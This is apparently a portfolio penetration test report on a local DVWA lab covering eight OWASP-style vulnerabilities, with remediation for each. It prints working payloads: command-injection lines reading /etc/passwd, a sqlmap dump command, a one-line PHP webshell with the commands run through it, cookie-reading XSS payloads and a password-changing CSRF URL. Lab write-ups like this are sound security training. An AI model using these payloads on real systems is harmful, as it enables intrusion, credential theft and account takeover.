# DVWA Penetration Test Report

**Author:** Ahmad Zhairah
**LinkedIn:** https://www.linkedin.com/in/ahmad-zhairah-670089417/
**GitHub:** https://github.com/albert-security-cop/DVWA-Penetration-Testing-Lab
**Date:** June 2025
**Classification:** Personal Lab / Portfolio

---

## Executive Summary

A full penetration test was conducted against a locally hosted DVWA (Damn Vulnerable Web Application) instance running on Ubuntu Server 22.04. The assessment covered reconnaissance, exploitation of eight vulnerability classes, and documentation of findings. All attacks were performed at security level **Low** in a controlled, isolated lab environment.

Eight critical and high-severity vulnerabilities were successfully exploited, resulting in remote code execution, full database compromise, session hijacking, and unauthorized account takeover. The target system offered no meaningful resistance at the Low security level, confirming that default or misconfigured web applications are highly susceptible to well-known attack techniques.

---

## Engagement Details

| Field | Value |
|---|---|
| Target IP | 192.168.100.129 |
| Attacker IP | 192.168.100.130 |
| Operating System | Ubuntu Server 22.04 |
| Web Server | Apache 2.4.66 |
| Application | DVWA (Damn Vulnerable Web Application) |
| Security Level | Low |
| Environment | Isolated local lab (VirtualBox / VMware) |
| Assessment Type | Black-box → Grey-box |
| Tester | Ahmad Zhairah |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port scanning and service enumeration |
| Nikto | Web vulnerability scanning |
| Hydra | Brute force credential attack |
| SQLMap | Automated SQL injection and database dumping |
| PHP Webshell | Remote code execution via file upload |
| Manual browser | Command injection, file inclusion, XSS, CSRF |

---

## Methodology

The assessment followed a structured penetration testing methodology across four phases:

1. **Reconnaissance** — passive and active enumeration of the target using Nmap and Nikto to identify open ports, services, versions, and web-level misconfigurations.
2. **Exploitation** — targeted exploitation of eight vulnerability classes identified in DVWA, performed manually and with purpose-built tools.
3. **Post-Exploitation** — extraction of credentials, remote command execution, session token theft, and account takeover.
4. **Documentation** — step-by-step writeups for each attack with screenshots, commands, results, and remediation guidance.

---

## Reconnaissance Summary

Three Nmap scans were performed to enumerate the attack surface, followed by a Nikto web vulnerability scan.

### Open Ports

| Port | State | Service | Version |
|---|---|---|---|
| 22/tcp | Open | SSH | OpenSSH 10.2p1 Ubuntu |
| 80/tcp | Open | HTTP | Apache httpd 2.4.66 (Ubuntu) |

Only two ports were open across all 65,535 scanned. The entire web attack surface was concentrated on port 80.

### Nikto Findings

| Vulnerability | Severity | Details |
|---|---|---|
| ETag Inode Leakage | Medium | CVE-2003-1418 — server leaks filesystem info via ETags |
| Missing Content-Security-Policy | Medium | No CSP header configured |
| Missing Strict-Transport-Security | Medium | No HSTS header configured |
| Missing Permissions-Policy | Low | No Permissions-Policy header |
| Missing Referrer-Policy | Low | No Referrer-Policy header |
| Missing X-Content-Type-Options | Low | Content type sniffing possible |
| Deprecated X-Frame-Options | Low | Should be replaced with CSP frame-ancestors |
| HTTP Methods Exposed | Info | GET, POST, OPTIONS, HEAD allowed |

---

## Vulnerability Summary

| # | Vulnerability | Severity | Outcome |
|---|---|---|---|
| 1 | Brute Force | High | Admin credentials cracked with Hydra |
| 2 | Command Injection | Critical | Remote OS commands executed as www-data |
| 3 | SQL Injection | Critical | Full database dumped — 5 user credentials extracted |
| 4 | File Inclusion | High | Local and remote files included via URL parameter |
| 5 | File Upload | Critical | PHP webshell uploaded — remote code execution achieved |
| 6 | XSS Reflected | High | Malicious scripts injected — cookies stolen |
| 7 | XSS Stored | High | Persistent payload stored — all visitors affected |
| 8 | CSRF | High | Admin password changed via forged request |

---

## Findings Detail

### 1. Brute Force

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/brute/`
**Tool:** Hydra

The login form lacked rate limiting, account lockout, and CAPTCHA. Hydra was used to automate credential guessing against the form, successfully recovering valid credentials.

**Impact:**
- Unauthorized access to authenticated areas of the application
- Credential reuse risk across other systems

**Remediation:**
- Implement account lockout after repeated failed attempts
- Add CAPTCHA to login forms
- Enforce strong password policies

---

### 2. Command Injection

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/exec/`
**Tool:** Manual

User input was passed directly to a system call without sanitisation. OS commands were appended using `&&` to execute arbitrary commands on the server.

**Key payloads used:**

```bash
127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 && uname -a
127.0.0.1 && ls /var/www/html/dvwa
```

**Impact:**
- Full OS command execution as `www-data`
- Server information disclosure
- Potential for reverse shell escalation

**Remediation:**
- Never pass user input directly to system functions
- Use allowlists to validate IP address format
- Apply `escapeshellarg()` or equivalent sanitisation

---

### 3. SQL Injection

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/sqli/`
**Tools:** Manual + SQLMap

The User ID field was vulnerable to SQL injection. A single quote caused a database error, confirming the vulnerability. SQLMap was then used to enumerate databases, tables, and dump all user credentials.

**SQLMap command:**

```bash
sqlmap -u "http://192.168.100.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=b33cac4a82d1936319b76746fcf21d7d; security=low" \
--dbs --tables --dump
```

**Credentials dumped:**

| Username | Password (MD5) | Cracked |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

**Impact:**
- Full database compromise
- All user credentials extracted and cracked
- Authentication bypass possible

**Remediation:**
- Use prepared statements and parameterised queries
- Implement input validation and output encoding
- Remove verbose database error messages from production

---

### 4. File Inclusion

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/fi/`
**Tool:** Manual

The `page` parameter accepted file paths without validation. Local files were included by manipulating the parameter with directory traversal sequences, exposing sensitive system files.

**Impact:**
- Disclosure of sensitive server files (e.g. `/etc/passwd`)
- Potential for remote file inclusion if `allow_url_include` is enabled

**Remediation:**
- Use an allowlist of permitted filenames
- Never pass user-controlled input directly to `include()` or `require()`
- Disable `allow_url_include` in `php.ini`

---

### 5. File Upload

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/upload/`
**Tool:** Manual + PHP Webshell

The file upload function validated only the file extension on the client side. A PHP webshell was uploaded and accessed directly via URL to execute arbitrary OS commands on the server.

**Webshell payload:**

```php
<?php echo system($_GET["cmd"]); ?>
```

**Uploaded to:**

```
http://192.168.100.129/dvwa/hackable/uploads/shell.php
```

**Commands executed via webshell:**

```
?cmd=whoami
?cmd=id
?cmd=uname -a
?cmd=cat /etc/passwd
?cmd=ls /var/www/html/dvwa/hackable/uploads
```

**Impact:**
- Remote code execution as `www-data`
- Full server access — files readable, commands executable
- Stepping stone for privilege escalation or reverse shell

**Remediation:**
- Validate file type server-side using MIME type inspection, not extension alone
- Store uploaded files outside the web root
- Disable PHP execution in upload directories via server configuration

---

### 6. XSS Reflected

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/xss_r/`
**Tool:** Manual

User input submitted via the name field was reflected in the HTML response without encoding. JavaScript payloads executed in the browser immediately upon submission.

**Payloads used:**

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<h1 style="color:red">Hacked</h1>
```

**Impact:**
- Session cookie theft — attacker can hijack authenticated sessions
- Phishing via DOM manipulation
- Malicious script delivery to users who click crafted links

**Remediation:**
- Encode all user-controlled output before rendering in HTML
- Implement a strict Content Security Policy (CSP)
- Validate and sanitise input server-side

---

### 7. XSS Stored

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/xss_s/`
**Tool:** Manual

Malicious JavaScript submitted via the guestbook form was stored in the database and rendered for every visitor who loaded the page. Unlike reflected XSS, no user interaction beyond visiting the page is required.

**Payloads used:**

```html
<script>alert('Stored XSS')</script>
<script>alert(document.cookie)</script>
```

**Impact:**
- Persistent attack — all visitors affected, not just link-clickers
- Mass session hijacking potential
- Higher severity than reflected XSS due to persistence

**Remediation:**
- Sanitise and encode all stored user input before database insertion and before rendering
- Implement CSP headers
- Apply output encoding at render time regardless of input validation

---

### 8. CSRF

**URL:** `http://192.168.100.129/dvwa/vulnerabilities/csrf/`
**Tool:** Manual

The password change form submitted credentials via a GET request with no CSRF token. A crafted URL was constructed that triggered the password change when visited by an authenticated user.

**Crafted malicious URL:**

```
http://192.168.100.129/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

The admin account password was successfully changed to `hacked` by visiting this URL while authenticated. Login with the new password was confirmed.

**Impact:**
- Unauthorized account takeover
- Password change executed without user knowledge or consent
- Applicable to any authenticated action on the site

**Remediation:**
- Implement anti-CSRF tokens on all state-changing requests
- Use POST instead of GET for sensitive actions
- Validate the `Referer` header as a secondary control

---

## Overall Risk Assessment

| Risk Level | Count | Vulnerabilities |
|---|---|---|
| Critical | 3 | Command Injection, SQL Injection, File Upload |
| High | 5 | Brute Force, File Inclusion, XSS Reflected, XSS Stored, CSRF |
| Medium | 0 | — |
| Low | 0 | — |

All eight vulnerabilities were successfully exploited. The combination of remote code execution (Command Injection, File Upload), full database compromise (SQL Injection), and account takeover (Brute Force, CSRF) represents a total compromise of the application and underlying server.

---

## Conclusion

This assessment demonstrates that a default DVWA installation at Low security is trivially exploitable across all vulnerability classes. Every attack succeeded on the first or second attempt, with no defensive controls blocking any technique.

The findings reflect real-world risks present in poorly configured or outdated web applications. Each vulnerability has a well-understood remediation path. Implementing input validation, output encoding, prepared statements, file type controls, CSRF tokens, and proper HTTP security headers would eliminate or significantly reduce the risk of every finding in this report.

This project was completed as a personal portfolio lab to demonstrate hands-on penetration testing skills across the OWASP Top 10.

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [Nmap Documentation](https://nmap.org/docs.html)
- [SQLMap Documentation](https://sqlmap.org/)
- [Nikto Documentation](https://cirt.net/Nikto2)

---

## Project Structure

```
DVWA-Penetration-Testing-Lab/
├── 01-Setup/
├── 02-Recon/
├── 03-Exploitation/
│   ├── 01-Brute-Force/
│   ├── 02-Command-Injection/
│   ├── 03-SQL-Injection/
│   ├── 04-File-Inclusion/
│   ├── 05-File-Upload/
│   ├── 06-XSS-Reflected/
│   ├── 07-XSS-Stored/
│   └── 08-CSRF/
└── 04-Report/
    └── README.md  ← this file
```
